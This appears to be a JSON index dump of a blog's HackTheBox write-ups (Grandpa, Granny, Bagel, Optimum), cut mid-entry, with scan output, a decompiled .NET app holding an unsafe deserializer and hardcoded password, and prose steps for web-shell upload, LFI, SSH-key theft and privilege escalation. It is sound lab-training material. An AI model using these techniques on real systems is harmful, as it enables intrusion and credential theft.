File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): 1 Hotfix(s) Installed. [01]: Q147222 Network Card(s): N/A Let\u0026rsquo;s run exploit suggester We have bunch of options to choose from Let\u0026rsquo;s start with the first one According to Microsoft: MS10-015 could allow elevation of privileges Set options and launch exploit And we rooted the box As an alternative path, we can exploit SeImpersonatePrivileges using Churrasco ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/grandpa/images/grandpa.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/grandpa/","summary":"Grandpa Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.14 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:44 BST Nmap scan report for 10.10.10.14 (10.10.10.14) Host is up (0.093s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 |_http-title: Under Construction | http-webdav-scan: | Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Grandpa"},{"categories":null,"contents":"Granny Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.0 | WebDAV type: Unknown |_ Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH |_http-title: Under Construction Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds gobuster â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://10.10.10.15/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.15/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/05 17:09:30 Starting gobuster in directory enumeration mode =============================================================== /_vti_inf.html (Status: 200) [Size: 1754] /postinfo.html (Status: 200) [Size: 2440] /. (Status: 200) [Size: 1433] /pagerror.gif (Status: 200) [Size: 2806] /iisstart.htm (Status: 200) [Size: 1433] Progress: 16223 / 16245 (99.86%) =============================================================== 2023/06/05 17:12:38 Finished =============================================================== Looks similar to Grandpa Yet we have success with davtest Foothold Let\u0026rsquo;s try creating file manually Launch Burp Suite And as we can see, we can create files Since it\u0026rsquo;s Microsoft-IIS/6.0 server, we need asp/aspx extension for our shell payload We can use either webshell or reverse shell I created payload using msfvenom Create a shell.txt file on the server And check if it was successful Prepare multi/handler Let\u0026rsquo;s check other HTTP methods MOVE looks interesting Let\u0026rsquo;s google it So we can see how we can use it in our case MOVE shell.txt to shell.aspx Start multi/handler We have a shell Root Since this box was similar to Grandpa the privesc path are also identical You can abuse SeImpersonatePrivileges Or run exploit suggester and run suggested exploits ","date":"June 4, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/granny/images/granny.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/granny/","summary":"Granny Enumeration Nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.15 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 18:54 BST Nmap scan report for 10.10.10.15 (10.10.10.15) Host is up (0.11s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 6.0 |_http-server-header: Microsoft-IIS/6.0 | http-methods: |_ Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT | http-webdav-scan: | Server Date: Sun, 04 Jun 2023 17:54:19 GMT | Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK | Server Type: Microsoft-IIS/6.","tags":["HTB"],"title":"[HTB] Machine: Granny"},{"categories":null,"contents":"Bagel Enumeration nmap â””â”€$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:35 GMT | Connection: close | Help, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:46 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; | RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Content-Length: 54 | Connection: close | Keep-Alive: true | \u0026lt;h1\u0026gt;Bad Request (Invalid request line (version).)\u0026lt;/h1\u0026gt; | TLSSessionReq: | HTTP/1.1 400 Bad Request | Content-Type: text/html | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:47 GMT | Content-Length: 52 | Connection: close | Keep-Alive: true |_ \u0026lt;h1\u0026gt;Bad Request (Invalid request line (parts).)\u0026lt;/h1\u0026gt; 8000/tcp open http-alt Werkzeug/2.2.2 Python/3.10.9 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 NOT FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:20 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 207 | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.1 302 FOUND | Server: Werkzeug/2.2.2 Python/3.10.9 | Date: Thu, 25 May 2023 18:15:14 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 263 | Location: http://bagel.htb:8000/?page=index.html | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html lang=en\u0026gt; | \u0026lt;title\u0026gt;Redirecting...\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Redirecting...\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;You should be redirected automatically to the target URL: \u0026lt;a href=\u0026#34;http://bagel.htb:8000/?page=index.html\u0026#34;\u0026gt;http://bagel.htb:8000/?page=index.html\u0026lt;/a\u0026gt;. If not, click the link. | Socks5: | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 4.01//EN\u0026#34; | \u0026#34;http://www.w3.org/TR/html4/strict.dtd\u0026#34;\u0026gt; | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=utf-8\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Error response\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;Error response\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;Error code: 400\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Message: Bad request syntax (\u0026#39; | \u0026#39;).\u0026lt;/p\u0026gt; | \u0026lt;p\u0026gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.\u0026lt;/p\u0026gt; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: Werkzeug/2.2.2 Python/3.10.9 |_http-title: Did not follow redirect to http://bagel.htb:8000/?page=index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port5000-TCP:V=7.93%I=7%D=5/25%Time=646FA5D2%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nServer:\\x20Microsoft SF:-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,E8,\u0026#34;HTTP/1\\.1\\x20400\\x2 SF:0Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-N SF:etCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:19\\x20GMT\\r\\ SF:nContent-Length:\\x2054\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r SF:\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(version\\) SF:\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(HTTPOptions,73,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nSer SF:ver:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2 SF:018:15:35\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(Help,E6,\u0026#34;HTTP/1\\.1 SF:\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20M SF:icrosoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46 SF:\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive: SF:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\ SF:(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(SSLSessionReq,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Requ SF:est\\r\\nContent-Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\ SF:r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Len SF:gth:\\x2052\\r\\nConnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Ba SF:d\\x20Request\\x20\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r( SF:TerminalServerCookie,E6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent- SF:Type:\\x20text/html\\r\\nServer:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu SF:,\\x2025\\x20May\\x202023\\x2018:15:46\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nC SF:onnection:\\x20close\\r\\nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x2 SF:0\\(Invalid\\x20request\\x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;)%r(TLSSessionReq,E SF:6,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\n SF:Server:\\x20Microsoft-NetCore/2\\.0\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023 SF:\\x2018:15:47\\x20GMT\\r\\nContent-Length:\\x2052\\r\\nConnection:\\x20close\\r\\ SF:nKeep-Alive:\\x20true\\r\\n\\r\\n\u0026lt;h1\u0026gt;Bad\\x20Request\\x20\\(Invalid\\x20request\\ SF:x20line\\x20\\(parts\\)\\.\\)\u0026lt;/h1\u0026gt;\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8000-TCP:V=7.93%I=7%D=5/25%Time=646FA5CE%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,1EA,\u0026#34;HTTP/1\\.1\\x20302\\x20FOUND\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\ SF:x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x20May\\x202023\\x2018:15:14\\x2 SF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length: SF:\\x20263\\r\\nLocation:\\x20http://bagel\\.htb:8000/\\?page=index\\.html\\r\\nCo SF:nnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title SF:\u0026gt;Redirecting\\.\\.\\.\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Redirecting\\.\\.\\.\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;You\\x20shoul SF:d\\x20be\\x20redirected\\x20automatically\\x20to\\x20the\\x20target\\x20URL:\\x SF:20\u0026lt;a\\x20href=\\\u0026#34;http://bagel\\.htb:8000/\\?page=index\\.html\\\u0026#34;\u0026gt;http://bagel SF:\\.htb:8000/\\?page=index\\.html\u0026lt;/a\u0026gt;\\.\\x20If\\x20not,\\x20click\\x20the\\x20li SF:nk\\.\\n\u0026#34;)%r(FourOhFourRequest,184,\u0026#34;HTTP/1\\.1\\x20404\\x20NOT\\x20FOUND\\r\\nS SF:erver:\\x20Werkzeug/2\\.2\\.2\\x20Python/3\\.10\\.9\\r\\nDate:\\x20Thu,\\x2025\\x2 SF:0May\\x202023\\x2018:15:20\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20chars SF:et=utf-8\\r\\nContent-Length:\\x20207\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doc SF:type\\x20html\u0026gt;\\n\u0026lt;html\\x20lang=en\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt; SF:h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found SF:\\x20on\\x20the\\x20server\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manu SF:ally\\x20please\\x20check\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p SF:\u0026gt;\\n\u0026#34;)%r(Socks5,213,\u0026#34;\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTM SF:L\\x204\\.01//EN\\\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\u0026#34;http://www\\.w3\\.org SF:/TR/html4/strict\\.dtd\\\u0026#34;\u0026gt;\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\u0026lt;meta\\x20http-equiv=\\\u0026#34;Content-Type\\\u0026#34;\\x20content=\\\u0026#34;te SF:xt/html;charset=utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;Error\\ SF:x20response\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;body\u0026gt;\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;Error\\x20response\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code:\\x20400\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\u0026lt;p\u0026gt;Message:\\x20Bad\\x20request\\x20syntax\\x20\\(\u0026#39;\\\\x05\\\\x04\\\\x0 SF:0\\\\x01\\\\x02\\\\x80\\\\x05\\\\x01\\\\x00\\\\x03\u0026#39;\\)\\.\u0026lt;/p\u0026gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\u0026lt;p\u0026gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20 SF:-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.\u0026lt;/p\u0026gt;\\n\\x2 SF:0\\x20\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 109.25 seconds We see 3 ports Let\u0026rsquo;s check port 8000 After scanning through web server, we detect LFI We see there are 2 users: developer and phil Foothold So let\u0026rsquo;s fire up the Burp Suite and enumerate the python app (since we saw http-server-header: Werkzeug/2.2.2 Python/3.10.9) Check /proc/self/environ Check /proc/self/cmdline We see the location of the app.py Let\u0026rsquo;s open it and see the content We see the comment in the app.py about running dotnet \u0026lt;path to .dll\u0026gt; And the websocket running on port 5000 Let\u0026rsquo;s test websocket I was stuck here for a while, since had no idea what to do next Played with different inputs to websocket But then, I remembered about the dll comment So I started utilizing the LFI to find the dll Since the port was already open means that the process with dll was already deployed Thus we scan through all processes and filter for dll We get a few hits So let\u0026rsquo;s check them After finding the location of dll, let\u0026rsquo;s download it I googled around to find a tool for decompiling the dll The app.py already had a hint with comment dotnet So I found ilspycmd which can be run on Linux OS If you have Windows machine, you can also use dnSpy Let\u0026rsquo;s decompile the dll The result Take note of password stored in DB class using System; using System.Collections.Generic; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.CompilerServices; using System.Runtime.Versioning; using System.Text; using System.Threading; using Microsoft.CodeAnalysis; using Microsoft.Data.SqlClient; using Newtonsoft.Json; using WatsonWebsocket; [assembly: CompilationRelaxations(8)] [assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)] [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)] [assembly: TargetFramework(\u0026#34;.NETCoreApp,Version=v6.0\u0026#34;, FrameworkDisplayName = \u0026#34;\u0026#34;)] [assembly: AssemblyCompany(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyConfiguration(\u0026#34;Debug\u0026#34;)] [assembly: AssemblyFileVersion(\u0026#34;1.0.0.0\u0026#34;)] [assembly: AssemblyInformationalVersion(\u0026#34;1.0.0\u0026#34;)] [assembly: AssemblyProduct(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyTitle(\u0026#34;bagel\u0026#34;)] [assembly: AssemblyVersion(\u0026#34;1.0.0.0\u0026#34;)] namespace Microsoft.CodeAnalysis { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] internal sealed class EmbeddedAttribute : Attribute { } } namespace System.Runtime.CompilerServices { [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)] internal sealed class NullableAttribute : Attribute { public readonly byte[] NullableFlags; public NullableAttribute(byte P_0) { NullableFlags = new byte[1] { P_0 }; } public NullableAttribute(byte[] P_0) { NullableFlags = P_0; } } [CompilerGenerated] [Microsoft.CodeAnalysis.Embedded] [AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)] internal sealed class NullableContextAttribute : Attribute { public readonly byte Flag; public NullableContextAttribute(byte P_0) { Flag = P_0; } } } namespace bagel_server { public class Handler { public object Serialize(object obj) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown return JsonConvert.SerializeObject(obj, (Formatting)1, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } public object Deserialize(string json) { //IL_0003: Unknown result type (might be due to invalid IL or missing references) //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_0015: Expected O, but got Unknown try { return JsonConvert.DeserializeObject\u0026lt;Base\u0026gt;(json, new JsonSerializerSettings { TypeNameHandling = (TypeNameHandling)4 }); } catch { return \u0026#34;{\\\u0026#34;Message\\\u0026#34;:\\\u0026#34;unknown\\\u0026#34;}\u0026#34;; } } } public class Bagel { private static string _ServerIp = \u0026#34;*\u0026#34;; private static int _ServerPort = 5000; private static bool _Ssl = false; private static WatsonWsServer _Server = null; private static void Main(string[] args) { InitializeServer(); StartServer(); while (true) { Thread.Sleep(1000); } } private static void InitializeServer() { //IL_0010: Unknown result type (might be due to invalid IL or missing references) //IL_001a: Expected O, but got Unknown _Server = new WatsonWsServer(_ServerIp, _ServerPort, _Ssl); _Server.AcceptInvalidCertificates = true; _Server.MessageReceived += MessageReceived; } private static async void StartServer() { await _Server.StartAsync(default(CancellationToken)); } private static void MessageReceived(object sender, MessageReceivedEventArgs args) { string json = \u0026#34;\u0026#34;; if (args.Data != null \u0026amp;\u0026amp; args.Data.Count \u0026gt; 0) { json = Encoding.UTF8.GetString(args.Data.Array, 0, args.Data.Count); } Handler handler = new Handler(); object obj = handler.Deserialize(json); object obj2 = handler.Serialize(obj); _Server.SendAsync(args.IpPort, obj2.ToString(), default(CancellationToken)); } } public class Base : Orders { private int userid = 0; private string session = \u0026#34;Unauthorized\u0026#34;; public int UserId { get { return userid; } set { userid = value; } } public string Session { get { return session; } set { session = value; } } public string Time =\u0026gt; DateTime.Now.ToString(\u0026#34;h:mm:ss\u0026#34;); } public class Orders { private string order_filename; private string order_info; private File file = new File(); public object RemoveOrder { get; set; } public string WriteOrder { get { return file.WriteFile; } set { order_info = value; file.WriteFile = order_info; } } public string ReadOrder { get { return file.ReadFile; } set { order_filename = value; order_filename = order_filename.Replace(\u0026#34;/\u0026#34;, \u0026#34;\u0026#34;); order_filename = order_filename.Replace(\u0026#34;..\u0026#34;, \u0026#34;\u0026#34;); file.ReadFile = order_filename; } } } public class File { private string file_content; private string IsSuccess = null; private string directory = \u0026#34;/opt/bagel/orders/\u0026#34;; private string filename = \u0026#34;orders.txt\u0026#34;; public string ReadFile { get { return file_content; } set { filename = value; ReadContent(directory + filename); } } public string WriteFile { get { return IsSuccess; } set { WriteContent(directory + filename, value); } } public void ReadContent(string path) { try { IEnumerable\u0026lt;string\u0026gt; values = System.IO.File.ReadLines(path, Encoding.UTF8); file_content += string.Join(\u0026#34;\\n\u0026#34;, values); } catch (Exception) { file_content = \u0026#34;Order not found!\u0026#34;; } } public void WriteContent(string filename, string line) { try { System.IO.File.WriteAllText(filename, line); IsSuccess = \u0026#34;Operation successed\u0026#34;; } catch (Exception) { IsSuccess = \u0026#34;Operation failed\u0026#34;; } } } public class DB { [Obsolete(\u0026#34;The production team has to decide where the database server will be hosted. This method is not fully implemented.\u0026#34;)] public void DB_connection() { //IL_0008: Unknown result type (might be due to invalid IL or missing references) //IL_000e: Expected O, but got Unknown string text = \u0026#34;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K\u0026#34;; SqlConnection val = new SqlConnection(text); string text2 = \u0026#34;INSERT INTO orders (Name,Address,Count,Type) VALUES (\u0026#39;Eliot\u0026#39;,\u0026#39;Street\u0026#39;,4,\u0026#39;Baggel\u0026#39;)\u0026#34;; } } } Okay, this was the most challenging part After scrolling through code my intuition was telling me that we can exploit deserialization Found hacktricks, systemweakness and exploit-notes.hdks.org articles The hints from the HTB forum gave me confidence that I was on the right path So I started playing around with different tools recommended in the hacktricks article that could be helpful in exploiting No luck with RCE So I knew my approach was wrong maybe I started reading other articles and systemweakness article was really helpful So we know we have a function that is responsible for deserialization Now I need to find canditates according to the article And we have one in Orders class named RemoveOrder We know we can deploy LFI based on exploit-notes.hdks.org We have a File class that we can use to achieve our goals We use File\u0026rsquo;s ReadFile and set the value to the file we want to read I started crafting payload based on the examples given in articles above and succeded Thus I didn\u0026rsquo;t fully understand the whole magic behind the exploitation and didn\u0026rsquo;t have a whole picture of exploit chain in the source code I suggest you to read 0xdf\u0026rsquo;s explanation, he has a nice exploitation map of this deserialization part Since the dll is running by a different user, we could probably read their ssh keys Let\u0026rsquo;s craft the payload to read id_rsa And we get phil's key Use the connect to the box and we get a foothold User Now we saw that there is another user: developer Let\u0026rsquo;s try the password that was stored in DB class, that we saw during decompilation Root After privescing to developer The first thing I always check is sudo rights developer can execute dotnet as root Check GTFOBins And we have a root I will check other writeups to paint the whole picture of the deserialization part since I solved it blindly So please check other writeups ","date":"June 3, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bagel/images/bagel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bagel/","summary":"Bagel Enumeration nmap â””â”€$ nmap -p22,5000,8000 -sC -sV -Pn 10.10.11.201 -T4 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-25 19:15 BST Nmap scan report for 10.10.11.201 (10.10.11.201) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.8 (protocol 2.0) | ssh-hostkey: | 256 6e4e1341f2fed9e0f7275bededcc68c2 (ECDSA) |_ 256 80a7cd10e72fdb958b869b1b20652a98 (ED25519) 5000/tcp open upnp? | fingerprint-strings: | GetRequest: | HTTP/1.1 400 Bad Request | Server: Microsoft-NetCore/2.0 | Date: Thu, 25 May 2023 18:15:19 GMT | Connection: close | HTTPOptions: | HTTP/1.","tags":["HTB"],"title":"[HTB] Machine: Bagel"},{"categories":null,"contents":"Optimum Enumeration Nmap â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sC -sV 10.10.10.8 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 19:02 BST Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.091s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.60 seconds Web server We see the version and the application running HttpFileServer 2.3 Let\u0026rsquo;s google Foothold/User Let\u0026rsquo;s copy an exploit and run I started Http server and hosted shell.ps1 And we get a shell Root Let\u0026rsquo;s start enumerating for privesc systeminfo PS C:\\Users\\kostas\\Downloads\u0026gt; systeminfo Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 00252-70000-00000-AA535 Original Install Date: 18/3/2017, 1:51:36 ?? System Boot Time: 9/6/2023, 5:55:25 ?? System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest Total Physical Memory: 4.095 MB Available Physical Memory: 3.481 MB Virtual Memory: Max Size: 5.503 MB Virtual Memory: Available: 4.932 MB Virtual Memory: In Use: 571 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: \\\\OPTIMUM Hotfix(s): 31 Hotfix(s) Installed. [01]: KB2959936 [02]: KB2896496 [03]: KB2919355 [04]: KB2920189 [05]: 